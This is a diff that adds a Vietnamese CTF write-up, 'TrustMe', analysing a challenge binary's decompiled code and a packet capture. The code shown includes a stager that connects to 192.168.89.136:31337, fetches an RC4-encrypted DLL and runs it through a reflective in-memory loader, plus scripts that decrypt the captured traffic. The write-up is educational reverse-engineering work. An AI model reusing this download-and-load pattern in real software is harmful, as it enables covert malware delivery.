@@ -1057,6 +1057,484 @@ if __name__ == "__main__":
 
 `TCP1P{wh4t_4_r3v3rs3_3ng1neEr!_76ad1fea}`
 
+### TrustMe
+
+Đầu tiên là main 
+```cpp
+void __noreturn sub_4033C0()
+{
+  int v0; // ebx
+  int v1; // esi
+  int v2; // edi
+  const void *v3; // esi
+  int v4; // eax
+  void *v5; // edi
+  const CHAR *v6; // ebx
+  int v7; // ecx
+  HANDLE FileA; // esi
+  int v9; // [esp+0h] [ebp-20h]
+  int v10; // [esp+4h] [ebp-1Ch]
+  int v11; // [esp+8h] [ebp-18h]
+  DWORD v12[2]; // [esp+Ch] [ebp-14h] BYREF
+  DWORD nNumberOfBytesToWrite; // [esp+14h] [ebp-Ch]
+  LPSTR lpBuffer; // [esp+18h] [ebp-8h]
+  void *v15; // [esp+1Ch] [ebp-4h]
+  int savedregs; // [esp+20h] [ebp+0h]
+
+  lpBuffer = (LPSTR)malloc(0x1000u);
+  v0 = dword_4203A8(0);
+  v1 = dword_4203BC(v0, 105, "JPGENC");
+  v2 = dword_4203C0(v0, v1);
+  nNumberOfBytesToWrite = dword_420390(v0, v1);
+  v3 = (const void *)dword_4203AC(v2);
+  strcpy((char *)v12, "imSoSad");
+  v4 = dword_4203B0(0);
+  dword_4203A4(v4);
+  v15 = malloc(nNumberOfBytesToWrite);
+  memmove(v15, v3, nNumberOfBytesToWrite);
+  v5 = malloc(nNumberOfBytesToWrite + 1);
+  memset(v5, 0, nNumberOfBytesToWrite + 1);
+  sub_402620(v12, strlen((const char *)v12), v5);
+  v6 = lpBuffer;
+  GetCurrentDirectoryA(0x1000u, lpBuffer);
+  sub_401670(v7, (int)v6, (int)"%s\\stopDebug.jpg", (int)v6);
+  FileA = CreateFileA(v6, 0x40000000u, 0, 0, 2u, 0x80u, 0);
+  WriteFile(FileA, v5, nNumberOfBytesToWrite, 0, 0);
+  CloseHandle(FileA);
+  sub_4080D0(v6);
+  dword_4203B8(
+    0,
+    "Trust me, when have I ever tricked you?",
+    "Stop debugging!!!!",
+    16,
+    v9,
+    v10,
+    v11,
+    v12[0],
+    v12[1],
+    nNumberOfBytesToWrite,
+    lpBuffer,
+    v15,
+    savedregs);
+  _loaddll((char *)0xFFFFFFFF);
+  __debugbreak();
+}
+```
+
+Hàm main này thì chống debug, rồi in ảnh thôi. Check lại asm của main 
+
+<img width="620" height="682" alt="{F05D9C6A-6246-4259-AB0E-3C3940E00574}" src="https://github.com/user-attachments/assets/a3a43bc8-99ea-4cd6-b0ef-c07752243467" />
+
+Vào `sub_4034F0` thì mình thấy đoạn này cũng đang troll mình 
+
+```cpp
+void __fastcall sub_4034F0(int a1)
+{
+  bool v1; // zf
+  int v2; // eax
+  int v3; // edx
+  _DWORD *v4; // edi
+  int v5; // esi
+  int v6; // ebx
+  int v7; // eax
+  int v8; // ecx
+  int v9; // ebx
+  int v10; // esi
+  int v11; // edi
+  DWORD v12; // ebx
+  const void *v13; // esi
+  int v14; // eax
+  void *v15; // edi
+  const CHAR *v16; // ebx
+  int v17; // ecx
+  HANDLE FileA; // esi
+  _OWORD v19[15]; // [esp+0h] [ebp-10Ch] BYREF
+  int v20; // [esp+F0h] [ebp-1Ch]
+  int v21; // [esp+F4h] [ebp-18h]
+  int v22; // [esp+F8h] [ebp-14h]
+  DWORD nNumberOfBytesToWrite; // [esp+FCh] [ebp-10h]
+  LPSTR lpBuffer; // [esp+100h] [ebp-Ch]
+  const char *v25; // [esp+104h] [ebp-8h]
+  void *v26; // [esp+108h] [ebp-4h]
+
+  v1 = *(_BYTE *)a1 == 80;
+  v19[0] = xmmword_41DD20;
+  v25 = (const char *)a1;
+  v19[1] = xmmword_41DCE0;
+  v20 = 17956;
+  v19[2] = xmmword_41DCC0;
+  v21 = 9;
+  v19[3] = xmmword_41DD60;
+  v22 = 18225;
+  v19[4] = xmmword_41DCB0;
+  v19[5] = xmmword_41DCA0;
+  v19[6] = xmmword_41DD40;
+  v19[7] = xmmword_41DD30;
+  v19[8] = xmmword_41DD50;
+  v19[9] = xmmword_41DCD0;
+  v19[10] = xmmword_41DC90;
+  v19[11] = xmmword_41DCF0;
+  v19[12] = xmmword_41DD00;
+  v19[13] = xmmword_41DD10;
+  v19[14] = xmmword_41DC80;
+  if ( v1 )
+  {
+    LOBYTE(v2) = *(_BYTE *)(a1 + 1);
+    v3 = a1 + 1;
+    if ( (_BYTE)v2 )
+    {
+      v4 = v19;
+      v26 = (void *)~a1;
+      while ( 1 )
+      {
+        v5 = *(char *)(v3 - 1);
+        v2 = (char)v2;
+        v6 = 2 * (char)v2;
+        v7 = v2 * v2;
+        v8 = (((_BYTE)v3 + (_BYTE)v26) & 1) != 0 ? v5 - v6 : v5 + v6;
+        if ( v7 + v5 * v8 != *v4 )
+          break;
+        LOBYTE(v2) = *(_BYTE *)++v3;
+        ++v4;
+        if ( !(_BYTE)v2 )
+          goto LABEL_9;
+      }
+    }
+    else
+    {
+LABEL_9:
+      lpBuffer = (LPSTR)malloc(0x1000u);
+      v9 = dword_4203A8(0);
+      v10 = dword_4203BC(v9, 101, "JPGENC");
+      v11 = dword_4203C0(v9, v10);
+      v12 = dword_420390(v9, v10);
+      nNumberOfBytesToWrite = v12;
+      v13 = (const void *)dword_4203AC(v11);
+      v14 = dword_4203B0(0);
+      dword_4203A4(v14);
+      v26 = malloc(v12);
+      memmove(v26, v13, v12);
+      v15 = malloc(v12 + 1);
+      memset(v15, 0, v12 + 1);
+      sub_402620(v25, strlen(v25), v15);
+      v16 = lpBuffer;
+      GetCurrentDirectoryA(0x1000u, lpBuffer);
+      sub_401670(v17, (int)v16, (int)"%s\\likeFlag.jpg", (int)v16);
+      FileA = CreateFileA(v16, 0x40000000u, 0, 0, 2u, 0x80u, 0);
+      WriteFile(FileA, v15, nNumberOfBytesToWrite, 0, 0);
+      CloseHandle(FileA);
+      sub_4080D0(v16);
+    }
+  }
+}
+```
+Thế nhưng ct có một function này khá đặc biệt
+```cpp
+int sub_403010()
+{
+  _DWORD *v0; // ebx
+  int v1; // eax
+  int v2; // esi
+  int v3; // eax
+  PADDRINFOA *v4; // edi
+  int (__stdcall *v5)(const char *, const char *, int, int); // eax
+  int v6; // eax
+  PADDRINFOA v7; // eax
+  int v8; // eax
+  int v9; // ecx
+  int v10; // eax
+  int v11; // eax
+  int v12; // esi
+  int v13; // eax
+  int v14; // esi
+  int v15; // edi
+  void *v16; // edi
+  int v17; // esi
+  int v18; // ebx
+  int v19; // edi
+  int v20; // eax
+  int *v21; // esi
+  int v22; // eax
+  int v23; // eax
+  int v24; // eax
+  void *v26; // [esp+70h] [ebp-24h]
+  unsigned int v27; // [esp+74h] [ebp-20h]
+  int v28; // [esp+78h] [ebp-1Ch]
+  _DWORD v29[2]; // [esp+8Ch] [ebp-8h] BYREF
+
+  malloc(8u);
+  sub_402720();
+  v29[0] = 4;
+  v0 = malloc(0x14u);
+  v26 = dword_420398;
+  *(_OWORD *)v0 = 0;
+  v0[4] = 0;
+  memset(v26, 0, 0x2CCu);
+  v1 = dword_4203B0(0);
+  dword_4203A4(v1);
+  v2 = sub_401480();
+  v3 = (*(int (__stdcall **)(int, int))(v2 + 456))(514, v2);
+  *(_DWORD *)(v2 + 444) = v3;
+  if ( v3 )
+    ExitProcess(1u);
+  *(_DWORD *)(v2 + 412) = 0;
+  v4 = (PADDRINFOA *)(v2 + 404);
+  *(_DWORD *)(v2 + 428) = 0;
+  *(_DWORD *)(v2 + 432) = 0;
+  *(_DWORD *)(v2 + 436) = 0;
+  *(_DWORD *)(v2 + 440) = 0;
+  v5 = *(int (__stdcall **)(const char *, const char *, int, int))(v2 + 460);
+  *(_DWORD *)(v2 + 416) = 0;
+  *(_DWORD *)(v2 + 420) = 1;
+  *(_DWORD *)(v2 + 424) = 6;
+  v6 = v5("192.168.89.136", "31337", v2 + 412, v2 + 404);
+  *(_DWORD *)(v2 + 444) = v6;
+  if ( v6 )
+    goto LABEL_4;
+  v7 = *v4;
+  *(_DWORD *)(v2 + 408) = *v4;
+  if ( v7 )
+  {
+    while ( 1 )
+    {
+      v8 = (*(int (__stdcall **)(int, int, int))(v2 + 464))(v7->ai_family, v7->ai_socktype, v7->ai_protocol);
+      *(_DWORD *)(v2 + 400) = v8;
+      (*(void (__stdcall **)(int, int, int, int, int))(v2 + 468))(v8, 0xFFFF, 4101, v2 + 452, 4);
+      v9 = *(_DWORD *)(v2 + 400);
+      if ( v9 == -1 )
+        break;
+      v10 = (*(int (__stdcall **)(int, _DWORD, _DWORD))(v2 + 476))(
+              v9,
+              *(_DWORD *)(*(_DWORD *)(v2 + 408) + 24),
+              *(_DWORD *)(*(_DWORD *)(v2 + 408) + 16));
+      *(_DWORD *)(v2 + 444) = v10;
+      if ( v10 == -1 )
+      {
+        (*(void (__stdcall **)(_DWORD))(v2 + 480))(*(_DWORD *)(v2 + 400));
+        v11 = *(_DWORD *)(v2 + 408);
+        *(_DWORD *)(v2 + 400) = -1;
+        v7 = *(PADDRINFOA *)(v11 + 28);
+        *(_DWORD *)(v2 + 408) = v7;
+        if ( v7 )
+          continue;
+      }
+      goto LABEL_9;
+    }
+LABEL_4:
+    (*(void (**)(void))(v2 + 472))();
+    ExitProcess(1u);
+  }
+LABEL_9:
+  freeaddrinfo(*v4);
+  if ( *(_DWORD *)(sub_401480() + 400) != -1 )
+  {
+    v12 = sub_401480();
+    if ( !(*(int (__stdcall **)(_DWORD, _DWORD *, int, _DWORD))(v12 + 488))(*(_DWORD *)(v12 + 400), v0, 512, 0) )
+    {
+      *(_DWORD *)(v12 + 400) = 0;
+      *(_BYTE *)(v12 + 496) = 0;
+    }
+    v13 = sub_401480();
+    (*(void (__stdcall **)(_DWORD, _DWORD *, int, _DWORD))(v13 + 484))(*(_DWORD *)(v13 + 400), v29, 1, 0);
+    v29[0] = strlen((const char *)sub_402920());
+    sub_4029C0(v0);
+    strlen((const char *)sub_402920());
+    sub_402920();
+    sub_4029C0(v0);
+    v14 = dword_4203B4 + 4;
+    v15 = sub_401480();
+    if ( !(*(int (__stdcall **)(_DWORD, int, int, _DWORD))(v15 + 488))(*(_DWORD *)(v15 + 400), v14, 4, 0) )
+    {
+      *(_DWORD *)(v15 + 400) = 0;
+      *(_BYTE *)(v15 + 496) = 0;
+    }
+    v16 = malloc(*(_DWORD *)(dword_4203B4 + 4));
+    v17 = *(_DWORD *)(dword_4203B4 + 4);
+    *(_DWORD *)(dword_4203B4 + 8) = v16;
+    v18 = sub_401480();
+    if ( !(*(int (__stdcall **)(_DWORD, void *, int, _DWORD))(v18 + 488))(*(_DWORD *)(v18 + 400), v16, v17, 0) )
+    {
+      *(_DWORD *)(v18 + 400) = 0;
+      *(_BYTE *)(v18 + 496) = 0;
+    }
+    v27 = strlen((const char *)sub_402920());
+    v19 = dword_4203B4;
+    v28 = *(_DWORD *)(dword_4203B4 + 8);
+    v20 = sub_402920();
+    sub_402620(v20, v27, v28);
+    v21 = (int *)dword_4203B4;
+    v22 = sub_401F00(*(_DWORD *)(v19 + 8), *(_DWORD *)(v19 + 4));
+    *v21 = v22;
+    if ( !v22 )
+      sub_401600("Can't load library from memory.\n");
+    if ( !*(_DWORD *)dword_4203B4 )
+    {
+      _loaddll((char *)0xFFFFFFFF);
+      JUMPOUT(0x4033B3);
+    }
+    dword_420394 = sub_402720();
+    v29[1] = *(_DWORD *)dword_420394 / (unsigned int)dword_41F8B0;
+    v23 = sub_402920();
+    sub_4029C0(v23);
+  }
+  dword_42039C(1, sub_402E80);
+  v24 = dword_4203B0(5);
+  dword_4203A4(v24);
+  return 0;
+}
+```
+Đầu tiên nó đang gọi `sub_401480`, đoạn này chương trình đang thực hiện resolve API. 
+```cpp
+_DWORD *sub_711480()
+{
+  _DWORD *result; // eax
+  _DWORD *v1; // esi
+
+  result = (_DWORD *)dword_730358;
+  if ( !dword_730358 )
+  {
+    v1 = operator new(0x1F4u);
+    v1[100] = -1;
+    v1[101] = 0;
+    v1[102] = 0;
+    v1[112] = 512;
+    v1[113] = 500;
+    *((_BYTE *)v1 + 496) = 0;
+    v1[114] = sub_711B80("ws2_32.dll");         // WSAStartup
+    v1[115] = sub_711B80("ws2_32.dll");         // getaddrinfo
+    v1[116] = sub_711B80("ws2_32.dll");         // socket
+    v1[117] = sub_711B80("ws2_32.dll");         // setsockopt
+    v1[118] = sub_711B80("ws2_32.dll");         // WSACleanup
+    v1[119] = sub_711B80("ws2_32.dll");         // connect
+    v1[120] = sub_711B80("ws2_32.dll");         // closesocket
+    v1[121] = sub_711B80("ws2_32.dll");         // send
+    v1[122] = sub_711B80("ws2_32.dll");         // recv
+    v1[123] = sub_711B80("ws2_32.dll");         // shutdown
+    result = v1;
+    dword_730358 = (int)v1;
+  }
+  return result;
+}
+``` 
+Mình đã resolve hết các API và có được như sau. Đây là Winsock API và nó đang được gọi để thiết lập kết nối
+Vậy thì nó cũng khá là rõ rồi ct sẽ conect tới server `192.168.89.136: 31337` để truyền data.
+Tiếp theo, sau khi ct gọi hết hàm của winsock, nó sẽ gọi `sub_402920` là một hàm rand
+```cpp
+int __usercall sub_402920@<eax>(int a1@<ebp>)
+{
+  int result; // eax
+  unsigned int v2; // eax
+  _BYTE *v3; // edi
+  unsigned int i; // esi
+  char v5[64]; // [esp-40h] [ebp-4Ch] BYREF
+  int v6; // [esp+0h] [ebp-Ch]
+  void *v7; // [esp+4h] [ebp-8h]
+  void *retaddr; // [esp+Ch] [ebp+0h]
+
+  v6 = a1;
+  v7 = retaddr;
+  result = dword_420360;
+  if ( !dword_420360 )
+  {
+    v2 = unknown_libname_22(0);
+    srand(v2);
+    strcpy(v5, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
+    v3 = malloc(0x40u);
+    for ( i = 0; i < 64; ++i )
+      v3[i] = v5[rand() % 52];
+    v3[64] = 0;
+    result = (int)v3;
+    dword_420360 = (int)v3;
+  }
+  return result;
+}
+```
+Hàm sinh ra 64 byte random 
+Tiếp theo, đoạn này đang cố load một cái DLL
+```cpp
+    v22 = sub_401F00(*(_DWORD *)(v19 + 8), *(_DWORD *)(v19 + 4));
+    *v21 = v22;
+    if ( !v22 )
+      sub_401600("Can't load library from memory.\n");
+    if ( !*(_DWORD *)dword_4203B4 )
+    {
+      _loaddll((char *)0xFFFFFFFF);
+      JUMPOUT(0x4033B3);
+```
+`sub_401F00` ở đây là một Reflective PE loader, nó load DLL từ RAM 
+
+#### Phân tích file record
+
+<img width="1920" height="717" alt="{A6D4754B-76D3-4326-A495-4C4A534746D7}" src="https://github.com/user-attachments/assets/2963dc92-7ecd-4b64-b553-87f795878688" />
+
+- Tại số 6 server 31337 sẽ gửi đến client 51392 một cái key là `I'm_4_Gat3_K33per`
+- Tại số 9 ct có gửi một gói tin có 68 bytes và 64 bytes có được là do `sub_402920` cộng thêm 4 bytes padding. 64 bytes này sẽ được RC4 với key `I'm_4_Gat3_K33per`
+
+```py
+def rc4(key: bytes, data: bytes) -> bytes:
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) & 0xFF
+        S[i], S[j] = S[j], S[i]
+
+    out = []
+    x = y = 0
+    for byte in data:
+        x = (x + 1) & 0xFF
+        y = (y + S[x]) & 0xFF
+        S[x], S[y] = S[y], S[x]
+        out.append(byte ^ S[(S[x] + S[y]) & 0xFF])
+
+    return bytes(out)
+
+key        = b"I'm_4_Gat3_K33per"
+padding    = 4
+ciphertext = bytes.fromhex(
+    "86dad7bb918e87d161556ad2e40a89010adfe3aa41ca44764e786b738047456"
+    "cc80d021e7f60b56776b858225d45099f0e99b62f5758977fde740bcc2be36d"
+    "bf403eb860"
+)[padding:]
+
+plaintext = rc4(key, ciphertext)
+print(plaintext.decode("utf-8", errors="replace"))
+# WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM
+```
+Tiếp theo data sẽ được gửi từ server 31337 về lại client 51392 qua 11, 13, 14, 16, 17, 19, 20, 22. Mình sẽ dump cái data này để lấy DLL
+Script
+```py
+from scapy.all import rdpcap, TCP, Raw
+from arc4 import ARC4
+
+pcap_file = "record.pcapng"
+key = b'WTPjWbJafqNPqrZFswaijmyVKMddOrKzukegbVDpXJqDfulPDmDwDasqTwxvibnM'
+
+target_packets = [11,13,14,16,17,19,20,22]
+
+packets = rdpcap(pcap_file)
+
+blob = b''
+
+for i in target_packets:
+    pkt = packets[i-1]  # scapy is 0-indexed
+
+    if pkt.haslayer(Raw):
+        blob += bytes(pkt[Raw].load)
+    else:
+        print(f"[!] Packet {i} has no payload")
+
+# decrypt once
+result = ARC4(key).decrypt(blob)
+
+with open("record.dll", "wb") as f:
+    f.write(result)
+
+print("[+] Done")
+```
+To be continued
+
+
+
 
 
 
